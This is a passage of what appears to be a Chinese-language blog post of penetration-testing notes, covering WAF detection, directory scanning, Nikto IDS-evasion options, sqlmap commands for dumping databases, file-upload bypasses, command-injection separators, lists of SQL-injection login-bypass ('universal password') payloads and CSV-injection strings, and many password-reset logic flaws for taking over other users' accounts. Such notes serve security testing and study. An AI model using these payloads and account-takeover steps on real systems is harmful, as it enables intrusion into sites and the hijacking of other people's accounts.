<h3 id="1-3WAF及bypass"><a href="#1-3WAF及bypass" class="headerlink" title="1.3WAF及bypass"></a>1.3WAF及bypass</h3><p>　　探测WAF<br>　　Nmap探测WAF有两种脚本，<br>　　一种是http-waf-detect，一种是http-waf-fingerprint。<br>　　<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　nmap -p port --script&#x3D;http-waf-detect ip</span><br></pre></td></tr></table></figure><br>　　<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　wafw00f -a example.com</span><br></pre></td></tr></table></figure><br>　　<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　sqlmap-u “http:&#x2F;&#x2F;www.vxxxx.org&#x2F;ex.php?id&#x3D;1” --identify-waf</span><br></pre></td></tr></table></figure><br>　　bypass:<br>　　手工注入，详见笔记</p>
<h3 id="1-4目录、后台和敏感路径文件扫描"><a href="#1-4目录、后台和敏感路径文件扫描" class="headerlink" title="1.4目录、后台和敏感路径文件扫描"></a>1.4目录、后台和敏感路径文件扫描</h3><p>　　御剑目录（土司专版，笔记里有）、后台扫描（图片属性地址暴露），<br>　　完善目录和账密字典方法：<br>　　　　基础字典包合并去重</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　dymerge.py -u</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　python pydictor.py -tool uniqbiner &#x2F;my&#x2F;dict&#x2F;dirpath --output uniq.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　python pydictor.py -tool uniqifer &#x2F;tmp&#x2F;dicts.txt --output &#x2F;tmp&#x2F;uniq.txt</span><br></pre></td></tr></table></figure>
<h2 id="2-人工浏览-逐个请求burp"><a href="#2-人工浏览-逐个请求burp" class="headerlink" title="2.人工浏览\逐个请求burp"></a>2.人工浏览\逐个请求burp</h2><p>　　非常重要,有必要手动去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。<br>　　图片后台地址\图片后面的信息<br>　　跳转参数\奇怪的参数<br>　　泄露邮箱等社工信息<br>　　业务逻辑\架构</p>
<h2 id="3-自动化"><a href="#3-自动化" class="headerlink" title="3.自动化"></a>3.自动化</h2><p>　　自动化渗透测试框架:(待补充)<br>　　Sn1per<br>　　Ary<br>　　自动化信息收集效率较高，从github上多找一找，也可以自己写</p>
<h1 id="0x02-漏洞挖掘"><a href="#0x02-漏洞挖掘" class="headerlink" title="0x02 漏洞挖掘"></a>0x02 漏洞挖掘</h1><h2 id="1-漏洞扫描工具"><a href="#1-漏洞扫描工具" class="headerlink" title="1.漏洞扫描工具"></a>1.漏洞扫描工具</h2><p>　　注意:登录类网站扫描要带cookies扫才能扫到</p>
<h3 id="1-1Nikto-Web服务漏洞扫描器"><a href="#1-1Nikto-Web服务漏洞扫描器" class="headerlink" title="1.1Nikto Web服务漏洞扫描器"></a>1.1Nikto Web服务漏洞扫描器</h3><p>　　Tips:利用-Format选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -host http:&#x2F;&#x2F;example.com -output ~&#x2F;nikto.html -Format html</span><br></pre></td></tr></table></figure>
<pre><code>NIKTO使用方法：
1、命令：nikto -update #升级，更新插件；
2、Nikto -list-plugins #查看插件；
3、Nikto -host http://1.1.1.1 #扫描目标：域名方式；
4、Nikto -host http://1.1.1.1 -output #扫描并输出结果
5、Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号
6、Nikto -host www.baidu.com -port 443 -ssl #扫描https网站
7、Nikto -host 文件名.txt #批量扫描目标
8、nmap -p80 192.168.1.0/24 -oG - | nikto -host -      
#利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式
“|”用nikto进行扫描
9、nikto -host 192.168.0.1 -useproxy http://localhost:8070      
#利用代理进行扫描
10、-vhost     
#当一个网站存在多个端口时可以使用-vhost
遍历所有网站进行扫描或一个ip对应多个网站
11、Nikto交互形参数

配置文件：
路径：/etc/nikto.conf
User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本；
在nikto中最好修改成别的浏览器user agent；
设置cookie：
在配置文件中找到cookie进行设置（#STATIC-COOKIE= &quot;cookie1&quot;=&quot;cookie value&quot;;&quot;cookie2&quot;=&quot;cookie val&quot;）

IDS逃避技术：
主要为了躲避IDS、IPS检测告警-evasion #此参数使用方式（Nikto -host http://1.1.1.1 -evasion 1234）
逃避方式共8种：
1、随机url编码，2、自选路径，3、过早结束的URL
4、优先考虑长随机字符串5、参数欺骗
6、使用TAB作为命令的分隔符，7、使用变化的URL
8、使用Windows路径分隔符
</code></pre>
<h3 id="1-2AWVS漏扫"><a href="#1-2AWVS漏扫" class="headerlink" title="1.2AWVS漏扫"></a>1.2AWVS漏扫</h3><p>　　这个没什么好说的，破解版到处都是。</p>
<h3 id="1-3NESSUS"><a href="#1-3NESSUS" class="headerlink" title="1.3NESSUS"></a>1.3NESSUS</h3><p>　　实时更新插件的漏扫，很好用，就是激活流程麻烦。<br>　　<a href="https://www.wuyini.cn/765.html">https://www.wuyini.cn/765.html</a></p>
<h3 id="1-4Xray自动化的漏洞挖掘"><a href="#1-4Xray自动化的漏洞挖掘" class="headerlink" title="1.4Xray自动化的漏洞挖掘"></a>1.4Xray自动化的漏洞挖掘</h3><p>　　burp+xray：<br>　　　　BurpSuite + Xray 被动扫描配置 - Ritte - 博客园<br>　　或者直接挂浏览器，点到哪里，扫到哪里<br>　　xray+各种漏扫联动</p>
<h3 id="1-5Fuzz"><a href="#1-5Fuzz" class="headerlink" title="1.5Fuzz"></a>1.5Fuzz</h3><p>　　Fuzz可以发现应用程序中没有被引用但是确实是可以访问的页面。<br>　　Discover Content是Burp中专门用于此目的的工具。<br>　　Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。<br>　　FuzzDB包含一些用于此目的的非常牛逼的字典。</p>
<h2 id="2-挖掘漏洞"><a href="#2-挖掘漏洞" class="headerlink" title="2.挖掘漏洞"></a>2.挖掘漏洞</h2><h3 id="2-1SQL注入："><a href="#2-1SQL注入：" class="headerlink" title="2.1SQL注入："></a>2.1SQL注入：</h3><p>　　初步测试：见框就上，加’ “ ) ))% and 1=1 and 1=2　and2-1  or ，<br>　　抓包爆破常用SQL注入payload字典，上burp intruder<br>　　<strong>纯手工注入和手工绕过waf，详见笔记。</strong><br>　　通过搜索引擎，批量查找注入点，详见笔记。<br>　　然后用傀儡注入点批量搜集工具</p>
<p>　　实操案例：<br>　　sql注入思路（登录界面）和网络常用端口_u011975363的专栏-CSDN博客<br>　　超级SQL注入工具（github）</p>
<pre><code>sqlmap一把梭：
注意：命令为kali linux中运行的 （windows中用python sqlmap.py执行）

注入六连：
1.sqlmap -u  &quot;http://www.xx.com?id=x&quot;    查询是否存在注入点
2.--dbs         检测站点包含哪些数据库
3.--current-db    获取当前的数据库名
4.--tables -D &quot;db_name&quot;  获取指定数据库中的表名 -D后接指定的数据库名称
5.--columns  -T &quot;table_name&quot; -D &quot;db_name&quot;  获取数据库表中的字段
6.--dump -C &quot;columns_name&quot; -T &quot;table_name&quot; -D &quot;db_name&quot;  
获取字段的数据内容

COOKIE注入：
sqlmap -u &quot;http://www.xx.com/xxx.asp&quot; --cookie &quot;id=XXX   cookie&quot; --level 2  ＼
cookie注入 后接cookie值

POST注入：
（1）目标地址http:// www.xxx.com /login.asp
（2）打开burp代理
（3）点击表单提交
（4）burp获取拦截信息（post）
（5）右键保存文件（.txt）到指定目录下
（6）运行sqlmap并执行如下命令：
用例：sqlmap -r okay.txt  -p  username
// -r表示加载文件(及步骤（5）保存的路径)
-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）
（7）自动获取表单：--forms自动获取表单
例如：sqlmap -u www.xx.com/login.asp --forms
（8）指定参数搜索：--data
例如:sqlmap -u www.xx.com/login.asp --data &quot;username=1&quot;

常用指令：
1. --purge      【重新扫描（--purge 删除原先对该目标扫描的记录）
2. --tables      【获取表名
3. --dbs         【检测站点包含哪些数据库
4. --current-db    【获取当前的数据库名
5. --current-user  【检测当前用户
6. --is-dba   【判断站点的当前用户是否为数据库管理员
7. --batch      【默认确认，不询问你是否输入
8. --search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）
9. --threads 10  【线程，sqlmap线程最高设置为10
10.--level 3   【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头
的值，
当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5
11.--risk 3  【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
12.-v   【详细的等级(0-6)
    0：只显示Python的回溯，错误和关键消息。
    1：显示信息和警告消息。
    2：显示调试消息。
    3：有效载荷注入。
    4：显示HTTP请求。
    5：显示HTTP响应头。
    6：显示HTTP响应页面的内容
13.  --privileges  【查看权限
14.  --tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件
15.  --method &quot;POST&quot; --data &quot;page=1&amp;id=2&quot;   【POST方式提交数据
16.  --threads number　　【采用多线程 后接线程数
17.  --referer  &quot;&quot;  【使用referer欺骗
18.  --user-agent &quot;&quot;     【自定义user-agent
19.  --proxy “目标地址″   【使用代理注入

sqlmap常用路径：
1. 添加表字段的目录在/usr/share/sqlmap/txt/common-tables.txt
2. 存放扫描记录的目录在/root/.sqlmap/output

高阶玩法：
自己写tamper.py
</code></pre>
<h3 id="2-2XSS："><a href="#2-2XSS：" class="headerlink" title="2.2XSS："></a>2.2XSS：</h3><p>　　xss漏洞原理分析与挖掘方法 - 知乎<br>　　web漏洞 | XSS（跨站攻击脚本）详解<br>　　XSS汇总<br>　　XSS小结 - 先知社区<br>　　2020跨站点脚本[xss]速查表|雨苁<br>　　XSSer自动化工具<br>　　XSStrike 自动化绕过WAF<br>　　xss payload字典 burp爆破　<br>　　客服对话系统上XSS打cookie<br>　　搭建XSS平台  3s.wf/<br>　　xssor.io</p>
<h3 id="2-3文件上传"><a href="#2-3文件上传" class="headerlink" title="2.3文件上传"></a>2.3文件上传</h3><p>　　字典生成 <a href="https://github.com/c0ny1/upload-fuzz-dic-builder">https://github.com/c0ny1/upload-fuzz-dic-builder</a><br>　　<br>　　<strong>文件上传绕过总结，详见笔记</strong><br>　<br>　　目录穿越<br>　　上传后如果没有被文件重命名，可以在文件名值做目录跳转<br>　　　　注意一些像目录的参数名<br>　　　　　　dir　path　location　url<br>　　　　文件头绕过<br>　　　　　　修改上传类型 Content-Type<br>　　<br>　　双文件上传<br>　　<br>　　截断<br>　　　　长文件名<br>　　　　长Content-Disposition<br>　　　　%00截断<br>　　特殊文件<br>　　　　svg / html / htm / swf<br>　　　　　xss<br>　　　　pdf<br>　　　　　chrome 里可以跳转<br>　　　　cer / asa / spx / php5 / phtml<br>　　　　　可能会被当做动态语言解析<br>　　.htaccess / .user.ini  / web.config / web.xml<br>　　　　　修改解析规则<br>　　.xls / .xlsx<br>　　　　　POI Excel XXE<br>　　.tar / .tar.gz / .zip<br>　　　　　可能存在文件释放目录跳转问题<br>　　.pkl<br>　　　　　python反序列化文件<br>　　.xml<br>　　　　　可能有 XXE<br>　　.yaml / .yml<br>　　　　　YAML 反序列化<br>　　.jar / .class<br>　　　　　上传到 java classpath 的目录下，类被加载时执行代码<br>　　无大小和次数限制<br>　　　　　无限上传制造垃圾数据堵死硬盘<br>　　有图片加工的地方可以注意一下imagemagick命令执行</p>
<p>　　文件读取<br>　　　　读取系统敏感文件<br>　　文件包含<br>　　　　可读取文件或代码执行<br>　　文件删除<br>　　　　删除配置文件可破坏网站<br>　　　　删除安装锁可重装<br>　　文件解压<br>　　　　如果上传文件为 tar / tar.gz 类型，可以尝试构压缩包内文件名为../../../../xxx 的tar包<br>　　文件导出<br>　　　　如果是CSV 或者 Excel可以注意一下CSV注入<br>　　　　=2222-1<br>　　　　-1+1=2222-1<br>　　　　@=2222-1<br>　　　　\r\n=2222-1<br>　　　　111,=2222-1,</p>
<h3 id="2-4命令执行"><a href="#2-4命令执行" class="headerlink" title="2.4命令执行"></a>2.4命令执行</h3><p>　　命令注入<br>　　　　–xxxx 参数注入<br>　　　　| 和 | | 与符号<br>　　　　&amp; 和 &amp;&amp; 与符号<br>　　　　; 分号<br>　　　　${}</p>
<p>　　代码执行<br>　　　　表达式<br>　　　　freemarker<br>　　　　OGNL<br>　　　　Spel<br>　　　　jsel<br>　　非表达式（php）<br>　　　　eval<br>　　　　assert<br>　　　　call_user_func() / call_user_func_array()<br>　　　　preg_replace()<br>　　　　create_function()<br>　　　　array_map()<br>　　　　array_filter()<br>　　　　usort() / uasort()<br>　　　　反序列化<br>　　　　php 源文件拼接写入<br>　　java<br>　　　　反序列化<br>　　　　远程 jar 加载<br>　　　　反射机制<br>　　　　jsp 源文件拼接写入</p>
<h3 id="2-5弱口令及字典破解"><a href="#2-5弱口令及字典破解" class="headerlink" title="2.5弱口令及字典破解"></a>2.5弱口令及字典破解</h3><p>　　后台弱口令爆破撞库<br>　　（尝试万能密码、特定资产常用密码、弱口令后再撞库、有的数据库要输对用户名再注释<br>　　我的github有收集的字典　<a href="https://github.com/hackerX2021%EF%BC%89">https://github.com/hackerX2021）</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">asp aspx万能密码</span><br><span class="line">  1： &quot;or &quot;a&quot;&#x3D;&quot;a</span><br><span class="line">  2： &#39;)or(&#39;a&#39;&#x3D;&#39;a</span><br><span class="line">  3：or 1&#x3D;1--</span><br><span class="line">  4：&#39;or 1&#x3D;1--</span><br><span class="line">  5：a&#39;or&#39; 1&#x3D;1--</span><br><span class="line">  6： &quot;or 1&#x3D;1--</span><br><span class="line">  7：&#39;or&#39;a&#39;&#x3D;&#39;a</span><br><span class="line">  8： &quot;or&quot;&#x3D;&quot;a&#39;&#x3D;&#39;a</span><br><span class="line">  9：&#39;or&#39;&#39;&#x3D;&#39;</span><br><span class="line">  10：&#39;or&#39;&#x3D;&#39;or&#39;</span><br><span class="line">  11: 1 or &#39;1&#39;&#x3D;&#39;1&#39;&#x3D;1</span><br><span class="line">  12: 1 or &#39;1&#39;&#x3D;&#39;1&#39; or 1&#x3D;1</span><br><span class="line">  13: &#39;OR 1&#x3D;1%00</span><br><span class="line">  14: &quot;or 1&#x3D;1%00</span><br><span class="line">  15: &#39;xor</span><br><span class="line">  16: 新型万能登陆密码</span><br><span class="line"></span><br><span class="line">  用户名 &#39; UNION Select 1,1,1 FROM admin Where &#39;&#39;&#x3D;&#39; （替换表名admin）</span><br><span class="line">  密码 1</span><br><span class="line">  Username&#x3D;-1%cf&#39; union select 1,1,1 as password,1,1,1 %23</span><br><span class="line">  Password&#x3D;1</span><br><span class="line"></span><br><span class="line">  17..admin&#39; or &#39;a&#39;&#x3D;&#39;a 密码随便</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP万能密码</span><br><span class="line"></span><br><span class="line">  &#39;or&#39;&#x3D;&#39;or&#39;</span><br><span class="line"> </span><br><span class="line">  &#39;or 1&#x3D;1&#x2F;* 字符型 GPC是否开都可以使用</span><br><span class="line"></span><br><span class="line">  User: something</span><br><span class="line">  Pass: &#39; OR &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">jsp 万能密码</span><br><span class="line"></span><br><span class="line">  1&#39;or&#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">  admin&#39; OR 1&#x3D;1&#x2F;*</span><br><span class="line"></span><br><span class="line">  用户名：admin 系统存在这个用户的时候 才用得上</span><br><span class="line">  密码：1&#39;or&#39;1&#39;&#x3D;&#39;1</span><br><span class="line">  pydictor、cupp、crunch字典生成工具、自写字典生成py（小黑的人名字典py）；</span><br><span class="line">  dymerge字典合并去重工具、自己写去重py；hydra爆破工具</span><br></pre></td></tr></table></figure>
<p>　　tips:<br>　　　　超级弱口令检验工具<br>　　　　burpsuite 爆破<br>　　　　使用弱用户名对密码进行暴力破解<br>　　　　使用弱口令密码对用户名进行暴力破解</p>
<h3 id="2-6逻辑漏洞"><a href="#2-6逻辑漏洞" class="headerlink" title="2.6逻辑漏洞"></a>2.6逻辑漏洞</h3><p><strong>Cookie</strong></p>
<p>　　一些网站会利用 Cookie 是否为空、Session 是否为 true 来判断用户是否可以登录，只要构造一个 Cookie 或 Session 为 true 就可以绕过认证登录</p>
<p>　　通过修改 Cookie 中的某个参数来实现登录其他用户,要抓包具体分析</p>
<p><strong>数据篡改</strong><br>　　数量、金额、ID、邮箱等数据：最大超过限制、负数、0、其他用户数据，提交后查看是否进入正常业务流程，是否存在越权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例子：</span><br><span class="line">修改普通用户密码，抓包</span><br><span class="line">将 Referer 和 POST 中的普通用户改成 admin</span><br><span class="line">提交数据后，直接返回了 admin 的密码修改页面，利用逻辑漏洞获取超级权限</span><br><span class="line">抓包修改手机号参数为其他号码进行尝试，例如办理查询页面，输入自己的号码然后抓包，修改手机号为他人号码，查看是否可以查询他人业务</span><br><span class="line">手机号 篡改</span><br><span class="line">邮箱或者用户 篡改</span><br><span class="line">订单ID 篡改</span><br><span class="line">商品编号 篡改</span><br><span class="line">用户ID 篡改</span><br><span class="line">金额 篡改</span><br><span class="line">商品数量 篡改</span><br></pre></td></tr></table></figure>
<p><strong>验证码绕过</strong><br>　　drop掉页面<br>　　返回包里可能就有验证码<br>　　一次验证码多用<br>　　验证码识别插件，burp</p>
<p><strong>注册界面：</strong><br>　　任意用户注册<br>　　可爆破用户名<br>　　注入<br>　　XSS</p>
<p><strong>登录界面：</strong><br>　　爆破用户名、密码<br>　　注入<br>　　万能密码<br>　　Xss Xss+Csrf<br>　　修改返回包信息，登入他人账户<br>　　修改cookie中的参数，如user,admin,id等<br>　　干货 | 登录点测试的Tips</p>
<p><strong>忘记密码界面：</strong></p>
<p>　　任意密码重置概要：<br>　　1．重置一个账户，不发送验证码，设置验证码为空发送请求。<br>　　2．发送验证码，查看相应包<br>　　3．验证码生存期的爆破<br>　　4．修改相应包为成功的相应包<br>　　5．手工直接跳转到校验成功的界面<br>　　6．两个账户，重置别人密码时，替换验证码为自己正确的验证码<br>　　7．重置别人密码时，替换为自己的手机号<br>　　8．重置自己的成功时，同意浏览器重置别人的，不发验证码<br>　　9．替换用户名，ID，cookie，token参数等验证身份的参数<br>　　10．通过越权修改他人的找回信息如手机/邮箱来重置</p>
<p><strong>用户凭证暴力破解（验证码）</strong><br>　　绕过的话，这里可以考虑一个现状：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">phone&#x3D;18888888888abc</span><br><span class="line">国内很多情况下都没有过滤字符和限制输出长度，验证很有可能只是简单的处理</span><br><span class="line">只要更换手机号后面的字符，就可以绕过请求过于频繁的限制</span><br><span class="line">但是校验时，手机号后面的字符会被过滤，也就是可以利用暴力破解验证码（不计入次数）</span><br><span class="line">所以只要在暴力破解的同时，改变手机号后面的字符即可达到漏洞效果</span><br><span class="line"></span><br><span class="line">根据手机号找回密码，但是验证次数被限制，抓包</span><br><span class="line">可以尝试在手机号后面添加不为数字的字符，查看是否过滤</span><br><span class="line">根据手机号找回密码，随便输个验证码，抓包</span><br><span class="line">暴力破解验证码（假如只有四位），很快就可以破解出来</span><br><span class="line">四位或六位纯数字，验证码次数未限制</span><br><span class="line">例如：</span><br><span class="line">如果验证码次数限制，破解一会就会提示请求过于频繁，这时就需要绕过限制</span><br><span class="line">例如：</span><br><span class="line">通过密保问题找回密码，查看源码，密保问题和答案就在源码中显示</span><br></pre></td></tr></table></figure>
<p><strong>返回凭证（验证码 及 token）、邮箱弱 token、用户凭证有效性、重新绑定</strong><br>　　抓包，可以发现返回的数据中有一个加密的字符串（token），先记录下这个加密字符串<br>　　继续按照正常流程，登录邮箱获得验证码，返回填写验证码后，进入下一个填写新密码页面，发现 URL 后新增了一个加密验证的字符串<br>　　这个字符串就是之前数据包中记录的字符串，所以邮箱验证码这个环节可以绕过，直接用他人邮箱抓包获得加密字符串就可以重置他人密码</p>
<p>　　根据手机号找回密码，抓包，可以发现验证码直接显示 verifycode=xxxx，或者由 md5 加密后显示，解密即可（同理，有的时候输入用户名，抓包可以看到返回的手机号等其他信息）</p>
<p>　　根据邮箱找回密码,抓包直接返回,密码找回凭证可能在页面中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">利用两个帐号同时点击找回密码，去邮箱查看找回密码的链接，发现两者的随机 token 只差 1-2，而且可以猜测出为服务器时间</span><br><span class="line">所以可以用一个未知帐号和一个已知帐号同时点击找回密码，稍微遍历一下随机 token，就可以构造出未知帐号的密码找回链接</span><br><span class="line">例如：</span><br><span class="line">通过邮箱找回密码，正常流程去邮箱查看重置密码链接，发现链接处有一串 md5 加密字符串</span><br><span class="line">字符串解密，类似 1491293277（10位），可以判断为 Unix时间戳，（可能md5）</span><br><span class="line">重置他人密码只需要利用他人邮箱发送重置密码邮箱，在短时间内对 Unix时间戳 进行暴力破解，即可获得重置密码的链接</span><br><span class="line">重置密码链接直接使用用户名来区别，改变用户名即可更改他人密码</span><br></pre></td></tr></table></figure>
<p><strong>绕过token</strong><br>　　正常流程下，对每个功能模块进行抓包，分别是发送验证码，验证验证码是否正确，获取 token，重置密码<br>　　接下来，用他人帐号通过邮箱验证，抓包，将其中 Cookie 内从 JSESSIONID 开始的内容替换至正常流程的发生验证码包内，同时替换自己接受验证码的邮箱，提交<br>　　通过邮箱获取验证码后，将验证码、Cookie、他人帐号、自己邮箱替换至验证验证码模块，提交（不用在意返回是否错误）<br>　　继续替换内至获取 token 模块，提交获取 token<br>　　最后将获取的 token 和上面的内容替换至最后的重置密码模块，提交成功修改密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">通过邮箱找回密码，访问链接重置密码，输入新密码后提交时抓包，虽然有 token，但是依然可以直接修改 用户ID 进而修改他人密码</span><br><span class="line">例如：</span><br><span class="line">通过他人手机号找回密码，抓包，将他人手机号替换成自己的手机号，获取验证码，提交后修改密码</span><br><span class="line">通过自己手机号找回密码，获取验证码后抓包，将数据包中的 username 改为他人用户名，提交后成功修改他人密码</span><br></pre></td></tr></table></figure>
<p><strong>短信验证码、邮箱 token、重置密码 token</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">通过邮箱找回密码，URL 链接中修改 用户ID 为他人，邮箱不变，之后通过链接可以将他人账户绑定为自己的邮箱，之后通过邮箱找回密码</span><br><span class="line">例如：</span><br><span class="line">给已知账户绑定手机，发现绑定手机的 URL 链接中有 uid 参数，修改 uid 参数为他人的，即可实现将他人的账户绑定上自己的手机，之后通过手机来修改密码</span><br><span class="line">修改个人资料处抓包，修改 userId 为他人，修改 mobilePhone 为自己的手机，即可实现将他人的账户绑定上自己的手机，之后通过手机来修改密码</span><br></pre></td></tr></table></figure>
<p><strong>手机绑定、邮箱绑定</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">通过密码保护问题找回密码，抓包，将密码保护问题删除，直接修改密码，提交</span><br><span class="line">注：此处密保问题和新密码在同一页面</span><br><span class="line">例如：</span><br><span class="line">正常流程，通过手机号提交验证码找回密码处抓包，记录下这个包的内容</span><br><span class="line">通过已知用户名找回密码，查看源代码可以发现用户其他信息（比如：手机号、邮箱）</span><br><span class="line">通过发现的手机号选择通过手机找回密码，随便输入短信验证码，抓包</span><br><span class="line">修改之前记录下的包的内容，将其中 Session id、用户ID 修改为刚刚从其他用户名抓包获得的内容，提交这个包，即可成功修改他人密码</span><br></pre></td></tr></table></figure>
<p><strong>最终提交步骤</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">通过邮箱找回密码，最后通过链接至修改密码页面，修改密码后提交，抓包，获得 Uid 参数，修改为他人，即可修改其他用户密码</span><br></pre></td></tr></table></figure>
<p><strong>服务器验证的验证逻辑为空（绕过认证）</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如：</span><br><span class="line">通过邮箱找回密码，点击请重新发送邮件处抓包，将邮箱改为自己的邮箱，通过链接成功修改密码</span><br><span class="line">例如：</span><br><span class="line">通过手机找回密码，输入验证码和新的密码，F12 审查元素，修改自己的手机为他人手机，提交成功修改他人手机（也可以抓包修改）</span><br><span class="line">例如：</span><br><span class="line">正常流程下，密码找回，查看最后设置新密码页面的 URL，记录下来</span><br><span class="line">继续返回密码找回处，输入其他用户名，提交找回申请，直接访问上面记录下的修改密码页面，成功修改密码</span><br><span class="line">也可以正常流程下，修改密码页面抓包，修改其中的 USERNAME_COOKIE 为其他用户（有可能会经过编码，比如 base64），提交即可修改其他用户密码</span><br><span class="line">如果抓包其中有 step 参数，可以修改这个参数为最后一步（比如：5），提交便可略过之前的步骤</span><br><span class="line">跳过验证步骤、找回方式、直接到设置新密码页面</span><br><span class="line">例如：</span><br><span class="line">通过用户名找回密码，提交后会自动发送验证码到手机中，所以抓包，修改手机为自己的手机（如果其中有 type 之类的参数，也可以尝试修改，有 email之类的参数，可以尝试删除内容）</span><br><span class="line">发送修改后的包，手机成功接收验证码</span><br><span class="line">输入验证码，继续发送，抓包，如果有 type 之类的参数，可以继续尝试修改，发送就可以成功修改密码</span><br><span class="line">例如：</span><br><span class="line">通过手机找回密码，随便输入验证码，抓包，发送，拦截返回包</span><br><span class="line">修改返回包中的返回码，继续发送，说不定就可以绕过验证，直接跳到修改密码的页面</span><br><span class="line"></span><br><span class="line">通过手机找回密码，正常流程下到重置密码页面，抓包查看返回数据中有一段加密字符串</span><br><span class="line">利用他人手机找回密码，URL 跳转到验证身份页面，链接中就有一段加密字符串，记录下，随便输入验证码</span><br><span class="line">抓包，修改包中数据为正常流程下的数据，替换加密字符串，Forward 发送，就可以绕过验证码，直接修改密码</span><br></pre></td></tr></table></figure>
<p>　　输入用户名，加个单引号报错，说明可能存在报错，抓包，保存为 txt 文件，导入 Sqlmap 中跑一遍</p>
<p>　　找回密码处存在注入漏洞(见框就×)</p>
<p>　　通过邮箱找回密码，正常流程下，抓包查看提交验证码后返回的数据，发现有加密字符串，这个加密字符串和后面重新设置新密码 URL 链接中的加密字符串一样，所以可以利用这个加密字符串<br>　　根据上面提交验证码的抓包，修改其中的 User 为其他用户（User 有可能会使用 md5 加密），发送，就可以返回其他用户的加密字符串<br>　　重新返回到找回密码首页，利用其他用户找回，点下一步，到输入验证码处（也有可能需要点击发送验证码），直接修改 URL 链接，加入加密字符串，可以直接绕过验证码，重置密码</p>
<p><strong>session覆盖漏洞</strong><br>　　注册重复的用户名，例如 admin，相当于修改了密码</p>
<p>　　同一浏览器，首先输入自己的账户进行邮箱密码找回，进入邮箱查看链接，接着输入他人账户，进行密码找回，返回刚刚自己的邮箱点击链接，由于 session 覆盖导致了，这个链接成为了修改他人密码的链接，成功修改他人密码</p>
<p><strong>尝试正常密码找回流程</strong><br>　　选择不同的找回方式，记录所有数据包<br>　　　　邮箱找回密码<br>　　　　根据密码保护问题找回密码<br>　　　　根据手机号找回密码<br>　　分析数据包，找出敏感部分<br>　　分析后台找回机制所采用的验证手段<br>　　修改数据包进行验证是否存在密码找回漏洞</p>
<p><strong>补充getshell技巧</strong><br>　　干货 | 渗透之网站Getshell最全总结<br>　　后台getshell常用技巧总结<br>　　如何优雅的隐藏你的Webshell - FreeBuf网络安全行业门户<br>　　Webshell大全整理-安全工具-HACK学习内部圈子</p>
]]></content>
      <categories>
        <category>归纳总结</category>
      </categories>
      <tags>
        <tag>精华</tag>
      </tags>
  </entry>
</search>
